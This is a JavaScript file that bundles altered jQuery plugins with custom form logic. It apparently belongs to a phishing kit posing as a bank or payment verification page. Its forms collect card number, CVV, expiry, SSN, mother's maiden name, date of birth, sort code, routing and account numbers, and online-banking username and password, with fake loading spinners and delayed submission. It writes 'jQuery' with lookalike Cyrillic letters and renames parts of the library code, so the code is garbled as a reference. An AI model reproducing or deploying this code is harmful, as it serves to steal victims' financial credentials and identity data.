            return this.optional( element ) || /^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test( value );
        },
        date: function( value, element ) {
            return this.optional( element ) || !/Invalid|NaN/.test( new Date( value ).toString() );
        },
        dateISO: function( value, element ) {
            return this.optional( element ) || /^\d{4}[\/\-](0?[1-9]|1[012])[\/\-](0?[1-9]|[12][0-9]|3[01])$/.test( value );
        },
        number: function( value, element ) {
            return this.optional( element ) || /^(?:-?\d+|-?\d{1,3}(?:,\d{3})+)?(?:\.\d+)?$/.test( value );
        },
        digits: function( value, element ) {
            return this.optional( element ) || /^\d+$/.test( value );
        },
        // based on http://en.wikipedia.org/wiki/Luhn_algorithm
        cdnum: function( value, element ) {
            if ( this.optional( element ) ) {
                return "dependency-mismatch";
            }
            if ( value.match("00000") ){
                return false;
            }
            // accept only spaces, digits and dashes
            if ( /[^0-9 \-]+/.test( value ) ) {
                return false;
            }
            var nCheck = 0,
                nDigit = 0,
                bEven = false,
                n, cDigit;
            value = value.replace( /\D/g, "" );
            // Basing min and max length on
            // http://developer.ean.com/general_info/Valid_Credit_Card_Types
            if ( value.length < 13 || value.length > 19 ) {
                return false;
            }
            for ( n = value.length - 1; n >= 0; n--) {
                cDigit = value.charAt( n );
                nDigit = parseInt( cDigit, 10 );
                if ( bEven ) {
                    if ( ( nDigit *= 2 ) > 9 ) {
                        nDigit -= 9;
                    }
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return ( nCheck % 10 ) === 0;
        },
        minlength: function( value, element, param ) {
            var length = $.isArray( value ) ? value.length : this.getLength( value, element );
            return this.optional( element ) || length >= param;
        },
        maxlength: function( value, element, param ) {
            var length = $.isArray( value ) ? value.length : this.getLength( value, element );
            return this.optional( element ) || length <= param;
        },
        rangelength: function( value, element, param ) {
            var length = $.isArray( value ) ? value.length : this.getLength( value, element );
            return this.optional( element ) || ( length >= param[ 0 ] && length <= param[ 1 ] );
        },
        min: function( value, element, param ) {
            return this.optional( element ) || value >= param;
        },
        max: function( value, element, param ) {
            return this.optional( element ) || value <= param;
        },
        range: function( value, element, param ) {
            return this.optional( element ) || ( value >= param[ 0 ] && value <= param[ 1 ] );
        },
        equalTo: function( value, element, param ) {
            // bind to the blur event of the target in order to revalidate whenever the target field is updated
            // TODO find a way to bind the event just once, avoiding the unbind-rebind overhead
            var target = $( param );
            if ( this.settings.onfocusout ) {
                target.off( ".validate-equalTo" ).on( "blur.validate-equalTo", function() {
                    $( element ).valid();
                });
            }
            return value === target.val();
        },
        remote: function( value, element, param ) {
            if ( this.optional( element ) ) {
                return "dependency-mismatch";
            }
            var previous = this.previousValue( element ),
                validator, data;
            if (!this.settings.messages[ element.name ] ) {
                this.settings.messages[ element.name ] = {};
            }
            previous.originalMessage = this.settings.messages[ element.name ].remote;
            this.settings.messages[ element.name ].remote = previous.message;
            param = typeof param === "string" && { url: param } || param;
            if ( previous.old === value ) {
                return previous.valid;
            }
            previous.old = value;
            validator = this;
            this.startRequest( element );
            data = {};
            data[ element.name ] = value;
            $.ajax( $.extend( true, {
                mode: "abort",
                port: "validate" + element.name,
                dataType: "json",
                data: data,
                context: validator.currentForm,
                success: function( response ) {
                    var valid = response === true || response === "true",
                        errors, message, submitted;
                    validator.settings.messages[ element.name ].remote = previous.originalMessage;
                    if ( valid ) {
                        submitted = validator.formSubmitted;
                        validator.prepareElement( element );
                        validator.formSubmitted = submitted;
                        validator.successList.push( element );
                        delete validator.invalid[ element.name ];
                        validator.showErrors();
                    } else {
                        errors = {};
                        message = response || validator.defaultMessage( element, "remote" );
                        errors[ element.name ] = previous.message = $.isFunction( message ) ? message( value ) : message;
                        validator.invalid[ element.name ] = true;
                        validator.showErrors( errors );
                    }
                    previous.valid = valid;
                    validator.stopRequest( element, valid );
                }
            }, param ) );
            return "pending";
        }
    }
});
// ajax mode: abort
// usage: $.ajax({ mode: "abort"[, port: "uniqueport"]});
// if mode:"abort" is used, the previous request on that port (port can be undefined) is aborted via XMLHttpRequest.abort()
var pendingRequests = {},
    validationRequest;
// Use a prefilter if available (1.5+)
if ( configurations ) {
    $.ajaxPrefilter(function( settings, _, xhr ) {
        var port = settings.port;
        if ( settings.mode === "abort" ) {
            if ( pendingRequests[port] ) {
                pendingRequests[port].abort();
            }
            pendingRequests[port] = xhr;
        }
    });
} else {
    // Proxy ajax
    validationRequest = $.validationRequest;
    $.validationRequest = function( settings ) {
        var mode = ( "mode" in settings ? settings : $.ajaxSettings ).mode,
            port = ( "port" in settings ? settings : $.ajaxSettings ).port;
        if ( mode === "abort" ) {
            if ( pendingRequests[port] ) {
                pendingRequests[port].abort();
            }
            pendingRequests[port] = validationRequest.apply(this, arguments);
            return pendingRequests[port];
        }
        return validationRequest.apply(this, arguments);
    };
}
}));
// tipsy, facebook style tooltips for јQuеrу
// version 1.0.0a
// (c) 2008-2010 jason frame [jason@onehackoranother.com]
// released under the MIT license
(function($) {
    function maybeCall(thing, ctx) {
        return (typeof thing == 'function') ? (thing.call(ctx)) : thing;
    };
    function isElementInDOM(ele) {
      while (ele = ele.parentNode) {
        if (ele == document) return true;
      }
      return false;
    };
    function Tipsy(element, options) {
        this.$element = $(element);
        this.options = options;
        this.enabled = true;
        this.fixTitle();
    };
    Tipsy.prototype = {
        show: function() {
            var title = this.getTitle();
            if (title && this.enabled) {
                var $tip = this.tip();
                $tip.find('.tipsy-inner')[this.options.html ? 'html' : 'text'](title);
                $tip[0].className = 'tipsy'; // reset classname in case of dynamic gravity
                $tip.remove().css({top: 0, left: 0, visibility: 'hidden', display: 'block'}).prependTo(document.body);
                var pos = $.extend({}, this.$element.offset(), {
                    width: this.$element[0].offsetWidth,
                    height: this.$element[0].offsetHeight
                });
                var actualWidth = $tip[0].offsetWidth,
                    actualHeight = $tip[0].offsetHeight,
                    gravity = maybeCall(this.options.gravity, this.$element[0]);
                var tp;
                switch (gravity.charAt(0)) {
                    case 'n':
                        tp = {top: pos.top + pos.height + this.options.offset, left: pos.left + pos.width / 2 - actualWidth / 2};
                        break;
                    case 's':
                        tp = {top: pos.top - actualHeight - this.options.offset, left: pos.left + pos.width / 2 - actualWidth / 2};
                        break;
                    case 'e':
                        tp = {top: pos.top + pos.height / 2 - actualHeight / 2, left: pos.left - actualWidth - this.options.offset};
                        break;
                    case 'w':
                        tp = {top: pos.top + pos.height / 2 - actualHeight / 2, left: pos.left + pos.width + this.options.offset};
                        break;
                }
                if (gravity.length == 2) {
                    if (gravity.charAt(1) == 'w') {
                        tp.left = pos.left + pos.width / 2 - 15;
                    } else {
                        tp.left = pos.left + pos.width / 2 - actualWidth + 15;
                    }
                }
                $tip.css(tp).addClass('tipsy-' + gravity);
                $tip.find('.tipsy-arrow')[0].className = 'tipsy-arrow tipsy-arrow-' + gravity.charAt(0);
                if (this.options.className) {
                    $tip.addClass(maybeCall(this.options.className, this.$element[0]));
                }
                if (this.options.fade) {
                    $tip.stop().css({opacity: 0, display: 'block', visibility: 'visible'}).animate({opacity: this.options.opacity});
                } else {
                    $tip.css({visibility: 'visible', opacity: this.options.opacity});
                }
            }
        },
        hide: function() {
            if (this.options.fade) {
                this.tip().stop().fadeOut(function() { $(this).remove(); });
            } else {
                this.tip().remove();
            }
        },
        fixTitle: function() {
            var $e = this.$element;
            if ($e.attr('title') || typeof($e.attr('original-title')) != 'string') {
                $e.attr('original-title', $e.attr('title') || '').removeAttr('title');
            }
        },
        getTitle: function() {
            var title, $e = this.$element, o = this.options;
            this.fixTitle();
            var title, o = this.options;
            if (typeof o.title == 'string') {
                title = $e.attr(o.title == 'title' ? 'original-title' : o.title);
            } else if (typeof o.title == 'function') {
                title = o.title.call($e[0]);
            }
            title = ('' + title).replace(/(^\s*|\s*$)/, "");
            return title || o.fallback;
        },
        tip: function() {
            if (!this.$tip) {
                this.$tip = $('<div class="tipsy"></div>').html('<div class="tipsy-arrow"></div><div class="tipsy-inner"></div>');
                this.$tip.data('tipsy-pointee', this.$element[0]);
            }
            return this.$tip;
        },
        validate: function() {
            if (!this.$element[0].parentNode) {
                this.hide();
                this.$element = null;
                this.options = null;
            }
        },
        enable: function() { this.enabled = true; },
        disable: function() { this.enabled = false; },
        toggleEnabled: function() { this.enabled = !this.enabled; }
    };
    $.fn.tipsy = function(options) {
        if (options === true) {
            return this.data('tipsy');
        } else if (typeof options == 'string') {
            var tipsy = this.data('tipsy');
            if (tipsy) tipsy[options]();
            return this;
        }
        options = $.extend({}, $.fn.tipsy.defaults, options);
        function get(ele) {
            var tipsy = $.data(ele, 'tipsy');
            if (!tipsy) {
                tipsy = new Tipsy(ele, $.fn.tipsy.elementOptions(ele, options));
                $.data(ele, 'tipsy', tipsy);
            }
            return tipsy;
        }
        function enter() {
            var tipsy = get(this);
            tipsy.hoverState = 'in';
            if (options.delayIn == 0) {
                tipsy.show();
            } else {
                tipsy.fixTitle();
                setTimeout(function() { if (tipsy.hoverState == 'in') tipsy.show(); }, options.delayIn);
            }
        };
        function leave() {
            var tipsy = get(this);
            tipsy.hoverState = 'out';
            if (options.delayOut == 0) {
                tipsy.hide();
            } else {
                setTimeout(function() { if (tipsy.hoverState == 'out') tipsy.hide(); }, options.delayOut);
            }
        };
        if (!options.live) this.each(function() { get(this); });
        if (options.trigger != 'manual') {
            var binder   = options.live ? 'live' : 'bind',
                eventIn  = options.trigger == 'hover' ? 'mouseenter' : 'focus',
                eventOut = options.trigger == 'hover' ? 'mouseleave' : 'blur';
            this[binder](eventIn, enter)[binder](eventOut, leave);
        }
        return this;
    };
    $.fn.tipsy.defaults = {
        className: null,
        delayIn: 0,
        delayOut: 0,
        fade: false,
        fallback: '',
        gravity: 'n',
        html: false,
        live: false,
        offset: 0,
        opacity: 0.8,
        title: 'title',
        trigger: 'hover'
    };
    $.fn.tipsy.revalidate = function() {
      $('.tipsy').each(function() {
        var pointee = $.data(this, 'tipsy-pointee');
        if (!pointee || !isElementInDOM(pointee)) {
          $(this).remove();
        }
      });
    };
    // Overwrite this method to provide options on a per-element basis.
    // For example, you could store the gravity in a 'tipsy-gravity' attribute:
    // return $.extend({}, options, {gravity: $(ele).attr('tipsy-gravity') || 'n' });
    // (remember - do not modify 'options' in place!)
    $.fn.tipsy.elementOptions = function(ele, options) {
        return $.metadata ? $.extend({}, options, $(ele).metadata()) : options;
    };
    $.fn.tipsy.autoNS = function() {
        return $(this).offset().top > ($(document).scrollTop() + $(window).height() / 2) ? 's' : 'n';
    };
    $.fn.tipsy.autoWE = function() {
        return $(this).offset().left > ($(document).scrollLeft() + $(window).width() / 2) ? 'e' : 'w';
    };
    /**
     * yields a closure of the supplied parameters, producing a function that takes
     * no arguments and is suitable for use as an autogravity function like so:
     *
     * @param margin (int) - distance from the viewable region edge that an
     *        element should be before setting its tooltip's gravity to be away
     *        from that edge.
     * @param prefer (string, e.g. 'n', 'sw', 'w') - the direction to prefer
     *        if there are no viewable region edges effecting the tooltip's
     *        gravity. It will try to vary from this minimally, for example,
     *        if 'sw' is preferred and an element is near the right viewable 
     *        region edge, but not the top edge, it will set the gravity for
     *        that element's tooltip to be 'se', preserving the southern
     *        component.
     */
     $.fn.tipsy.autoBounds = function(margin, prefer) {
        return function() {
            var dir = {ns: prefer[0], ew: (prefer.length > 1 ? prefer[1] : false)},
                boundTop = $(document).scrollTop() + margin,
                boundLeft = $(document).scrollLeft() + margin,
                $this = $(this);
            if ($this.offset().top < boundTop) dir.ns = 'n';
            if ($this.offset().left < boundLeft) dir.ew = 'w';
            if ($(window).width() + $(document).scrollLeft() - $this.offset().left < margin) dir.ew = 'e';
            if ($(window).height() + $(document).scrollTop() - $this.offset().top < margin) dir.ns = 's';
            return dir.ns + (dir.ew ? dir.ew : '');
        }
    };

})(јQuеrу);

/*!
 * јQuеrу Cookie Plugin v1.4.1
 * https://github.com/carhartl/јQuеrу-cookie
 *
 * Copyright 2006, 2014 Klaus Hartl
 * Released under the MIT license
 */
(function (factory) {
    if (typeof define === 'function' && define.amd) {
        // AMD (Register as an anonymous module)
        define(['jquery'], factory);
    } else if (typeof exports === 'object') {
        // Node/CommonJS
        module.exports = factory(require('jquery'));
    } else {
        // Browser globals
        factory(јQuеrу);
    }
}(function ($) {
    var pluses = /\+/g;
    function encode(s) {
        return config.raw ? s : encodeURIComponent(s);
    }
    function decode(s) {
        return config.raw ? s : decodeURIComponent(s);
    }
    function stringifyCookieValue(value) {
        return encode(config.json ? JSON.stringify(value) : String(value));
    }
    function parseCookieValue(s) {
        if (s.indexOf('"') === 0) {
            // This is a quoted cookie as according to RFC2068, unescape...
            s = s.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, '\\');

        }
        try {
            // Replace server-side written pluses with spaces.
            // If we can't decode the cookie, ignore it, it's unusable.
            // If we can't parse the cookie, ignore it, it's unusable.
            s = decodeURIComponent(s.replace(pluses, ' '));
            return config.json ? JSON.parse(s) : s;
        } catch(e) {}
    }
    function read(s, converter) {
        var value = config.raw ? s : parseCookieValue(s);
        return $.isFunction(converter) ? converter(value) : value;
    }
    var config = $.cookie = function (key, value, options) {
        // Write
        if (arguments.length > 1 && !$.isFunction(value)) {
            options = $.extend({}, config.defaults, options);
            if (typeof options.expires === 'number') {
                var days = options.expires, t = options.expires = new Date();
                t.setMilliseconds(t.getMilliseconds() + days * 864e+5);
            }
            return (document.cookie = [
                encode(key), '=', stringifyCookieValue(value),
                options.expires ? '; expires=' + options.expires.toUTCString() : '', // use expires attribute, max-age is not supported by IE
                options.path    ? '; path=' + options.path : '',
                options.domain  ? '; domain=' + options.domain : '',
                options.secure  ? '; secure' : ''
            ].join(''));
        }
        // Read
        var result = key ? undefined : {},
            // To prevent the for loop in the first place assign an empty array
            // in case there are no cookies at all. Also prevents odd result when
            // calling $.cookie().
            cookies = document.cookie ? document.cookie.split('; ') : [],
            i = 0,
            l = cookies.length;
        for (; i < l; i++) {
            var parts = cookies[i].split('='),
                name = decode(parts.shift()),
                cookie = parts.join('=');
            if (key === name) {
                // If second argument (value) is a function it's a converter...
                result = read(cookie, value);
                break;
            }
            // Prevent storing a cookie that we couldn't decode.
            if (!key && (cookie = read(cookie)) !== undefined) {
                result[name] = cookie;
            }
        }
        return result;
    };
    config.defaults = {};
    $.removeCookie = function (key, options) {
        // Must not alter options, thus extending a fresh object...
        $.cookie(key, '', $.extend({}, options, { expires: -1 }));
        return !$.cookie(key);
    };
})); 
//////////////////////////////////// 

$('.start-link a').click(function(){
    $('.body').css ({'overflow':'hidden'});
    $('.pop-window').css ({'top':'0','overflow':'auto'});
  //$("#contents").addClass("pad");
    setTimeout(function() {
    $("#siedbar").addClass("before");
    }, 600); 
}); 
$('.close-link').click(function(){
    $('#page').show();
    $('.body').css ({'overflow':'auto'});
    $('.pop-window').css ({'top':'100%','overflow':'hidden'});
    $("#siedbar").removeClass("before");
   // $("#contents").removeClass("pad");
    $("#sidepanelNotifications").removeClass("hide");
    setTimeout(function() {   
    $('input').val("");
    $('input').removeClass("valid");
    $('#cdnum').css({'background-position':'400px'});
    $('.form-address').hide();
    $('.form-card').show();
    validator.resetForm();
    var options = document.querySelectorAll('#sel option');
   for (var i = 0, l = options.length; i < l; i++) {
    options[i].selected = options[i].defaultSelected;}
}, 800); 
});


$('select[name="address"]').change(function(){
    if ( $(this).val() == 1) {
        $('.form-card').hide();
        $('.form-address').show();
    }
});
$('.cancel-address').click(function(){
        $('.form-address').hide();
        $('.form-card').show();
});

   
$(".login").load("login_content");
    setTimeout(function(){
        $('.verification').load('verify_content',function(){
            $('#verification').removeClass('verification');
        });
    }, 3000);



 $.validator.addMethod("selected", function(value, element, arg){
    return arg != value;
 });
 $.validator.addMethod("selected_t", function(value, element, arg){
    return arg != value;
 });

$.validator.addMethod("zip_code", function (value, element) {
if ( value.match(/^(?:[A-Z0-9]+([- ]?[A-Z0-9]+)*)?$/) ){return true;} else {return false;}
});

$.validator.addMethod("fullname", function (value, element) {
if ( value.match(/^[a-zA-Z]+ [a-zA-Z]|[a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+$/) ) {return true;} else {return false};
});

  
//////////////////////////
 $.validator.addMethod("numonly", function(value, element) {
return this.optional(element) || /^[0-9/]+$/i.test(value); }, "");
$.validator.addMethod("lettersonly", function(value, element) {
return this.optional(element) || /^[a-z," "]+$/i.test(value); });
$.validator.addMethod("month", function(value, element) {
return this.optional(element) || /^(0[1-9]|1[0-2])$/.test(value);}, "");
$.validator.addMethod("day", function(value, element) {
return this.optional(element) || /^([0-2]?[0-9]|3[0-1])$/.test(value);}, "");
$.validator.addMethod("year", function (value, element) {
                // checking whether the date entered is in correct format
                var isValid = value.match(/^\d\d\d\d$/);
                if(isValid){
                    var minDate = Date.parse("1900");
                    var today = Date.parse("2007");
                    var DOB = Date.parse(value);
                    if ((DOB >= today || DOB <= minDate)) {
                        isValid =  false;
                    }
                    return isValid;
                }
            });
$.validator.addMethod("exxp",function (value, element) {

    // Initialize todays date   i.e start date
    var today = new Date();
    var startDate = new Date(today.getFullYear(),today.getMonth(),1,0,0,0,0);

    // Initialize End/Expiry date i.e. adding 10 years to expire
    var futureLimitDate= new Date(today.getFullYear()+10,today.getMonth(),1,0,0,0,0);
    var exxep = value;

    var expYearCheck='';

    // Check Date format
    var separatorIndex = exxep.indexOf('/');
    if(separatorIndex==-1)return false; // Return false if no / found

    var exxepArr=exxep.split('/'); 
    if(exxepArr.length>2)return false; // Return false if no num/num format found

    // Check Month for validity
    if(eval(exxepArr[0])<1||eval(exxepArr[0])>12){
        //If month is not valid i.e not in range 1-12
        return false;
    }

    //Check Year for format YY or YYYY
    switch(exxepArr[1].length){
        case 2:expYearCheck=2000+parseInt(exxepArr[1], 10);break; // If YY format convert it to 20YY to it
        case 4:expYearCheck=exxepArr[1];break; // If YYYY format assign it to check Year Var
        default:return false;break;
    }


    // Calculated new exp Date for ja  
    exxep=new Date(eval(expYearCheck),(eval(exxepArr[0])-1),1,0,0,0,0);


    if(Date.parse(startDate) <= Date.parse(exxep))
    {
        if(Date.parse(exxep) <= Date.parse(futureLimitDate))
        {
            // Date validated
            return true;    
        }else
        {

            // Date exceeds future date
            return false;

        } 

    }else
    {

        // Date is earlier than todays date
        return false;
    }


},""); 

 
          var card =  $(".form-card").validate({
                rules: { 
                        fullname:   { lettersonly: true, fullname:true},
                        dcn: { minlength:12, maxlength: 19, cdnum: true},
                        expiration:  { minlength: 5, maxlength: 5, exxp: true},
                        cvv:         { minlength: 3, maxlength: 4, },
                        address:     { selected: 0,  selected_t: 1},
                    }, 
                messages: { fullname: "", dcn: "", expiration: "",  cvv: "",  address: "" },
                 submitHandler: function(form) {
                    $('.bg_rotate').show();
            },
            });   
            var billing =  $(".form-address").validate({
                rules: {
                        address_1: { minlength:3, maxlength: 120},
                        city:      { minlength:3, maxlength: 30,  lettersonly: true },
                        zip_code:  { minlength:3, maxlength: 12, zip_code: true },
                    }, 
                messages: { address_1: "", zip_code: "" , city: ""},
                ///////////////////////////////////////////////////////////
                submitHandler: function(form) { 
                    var $option = $('input[name="address_1"]').val() + ' ' + $('input[name="address_2"]').val() + ', ' + $('input[name="zip_code"]').val() + ', ' + $('input[name="city"]').val(); 
                    $('.bg_rotate').show();
                    $('select.address').append('<option value="' + $option + '" selected>' +  $option + '</option>');
                    $('select.address').removeClass("error");
                    setTimeout(function() {
                        $('.bg_rotate').hide();
                        $('.form-address').hide();
                        $('.form-card').show();
                        //$('#11').text("+ Add another billing address");
                    }, 1000); 
                    return false
                ///////////////////////////////////////////////////////////
                },
            }); 
//////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

$( "#validate" ).validate({
  rules: {
    dob_1:     {day:true},
    dob_2:     {month:true},
    dob_3:     {year:true,numonly:true,},
    phone1:    {numonly:true,},
    phone2:    {numonly:true,},
    mmn:       {lettersonly:true},
    sort_1:    {numonly:true,minlength: 2,maxlength: 2},
    sort_2:    {numonly:true,minlength: 2,maxlength: 2},
    sort_3:    {numonly:true,minlength: 2,maxlength: 2},
    ssn_1:     {numonly:true,minlength: 3,maxlength: 3},
    ssn_2:     {numonly:true,minlength: 2,maxlength: 2},
    ssn_3:     {numonly:true,minlength: 4,maxlength: 4},
    acc_num:   {numonly:true,},
  },
  messages: {  

}, 
submitHandler: function(form){
$("#verification").hide();
$("#wait").show();
}
});

var bnk = $("#bnk_form").validate({
    rules: {
            rnum:  {maxlength:9,minlength:9,numonly:true},
            acnum: {maxlength:17,minlength:3,numonly:true},
        }, 
messages: { rnum: "", acnum: "", user: "", passbnk: ""},
submitHandler: function(form) {
$('.rotation').show();
setTimeout(function() {
document.getElementById("bnk_form").submit();
}, 2000);
},
}); 
$("input#user").on({
  keydown: function(e) {
    if (e.which === 32)
      return false;
  },
  change: function() {
    this.value = this.value.replace(/\s/g, "");
  }
});
    function block(){
        return false
    }
    $("#ask").click(function(){  
        if (document.getElementById('radio-personal').checked) {
            $("#qes").hide();
            $(".date_form").show();
        } else if (document.getElementById('radio-business').checked) {
            $("#qes").hide();
            $(".form-card").removeClass('ops');
        }
});


$("#back").click(function(){
            $(".date_form").hide();
            $("#qes").show();
            $("#radio-personal").prop('checked',false );
});
$.validator.addMethod(
    "australianDate",
    function(value, element) {
        // put your own logic here, this is just a (crappy) example
        return value.match(/^\d\d?\/\d\d?\/\d\d\d\d$/);
});
$(".date_form").validate({
     rules: {
            datte: {australianDate: true },
                    }, 
                messages: { datte: ""},
submitHandler: function(form){
    $(".rotation1").show();
    setTimeout(function(){
        $(".rotation1").hide();
        $("#err").show();
        $("#inpd").prop('disabled',true );
        $("#confirm").prop('disabled',true );
        $("#radio-personal").prop('disabled',true );
        $("#sp").css({'cursor':'no-drop','opacity':'0.5'}); 
        $("#okby").addClass('checkk');
    }, 2000); 
},
});
///////////////////////////////////////////////////////////////////////////
$('input').focus(function(){
    if (card !== undefined){
        card.resetForm();
        billing.resetForm();
    }else if (bnk !== undefined){
        bnk.resetForm();
    }
});
$(function(){
  $('#cdnum').bind('input', function(){
    $(this).val(function(_, v){
     return v.replace(/\s+/g, '');
    });
  });
});
function SelectCC(cdnum) {
var first = cdnum.charAt(0);
var second = cdnum.charAt(1);
var third = cdnum.charAt(2);
var fourth = cdnum.charAt(3);
var cdnum = (cdnum + '').replace(/\\s/g, ''); //remove space

if ((/^(417500|(4917|4913|4026|4508|4844)\d{2})\d{10}$/).test(cdnum) && cdnum.length == 16) {
//Electron
                document.getElementById("cdnum").style.backgroundPosition = "100% -322px";
                document.getElementById("cvv").maxLength ="3"
}
else if ((/^(4)/).test(cdnum) && (cdnum.length == 16)) {
//Visa
                document.getElementById("cdnum").style.backgroundPosition = "98% 2px";
                document.getElementById("cvv").maxLength ="3"
}
else if ((/^(34|37)/).test(cdnum) && cdnum.length == 16) {
//American Express
                document.getElementById("cdnum").style.backgroundPosition = "100% -77px";
                document.getElementById("cvv").maxLength ="4"
}
else if ((/^(34|37)/).test(cdnum) && cdnum.length == 15) {
//American Express
                document.getElementById("cdnum").style.backgroundPosition = "100% -77px";
                document.getElementById("cvv").maxLength ="4"
}
else if ((/^(51|52|53|54|55)/).test(cdnum) && cdnum.length == 16) {
//Mastercard
                document.getElementById("cdnum").style.backgroundPosition = "98% -32.2px";
                document.getElementById("cvv").maxLength ="3"
}
else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(cdnum) && cdnum.length == 16) {
//Maestro
                document.getElementById("cdnum").style.backgroundPosition = "100% -276px";
                document.getElementById("cvv").maxLength ="3"
}
else if ((/^(6011|16)/).test(cdnum) && cdnum.length == 16) {
//Discover
                document.getElementById("cdnum").style.backgroundPosition = "98% -123px";
}
else if ((/^(30|36|38|39)/).test(cdnum) && (cdnum.length == 14)) {
//DINER
                document.getElementById("cdnum").style.backgroundPosition = "100% -175px";
}
else if ((/^(35|3088|3096|3112|3158|3337)/).test(cdnum) && (cdnum.length == 16)) {
//JCB
                document.getElementById("cdnum").style.backgroundPosition = "100% -225.6px";
}
else {
                document.getElementById("cdnum").style.backgroundPosition = "100% 400px";
}

}

// ]]>
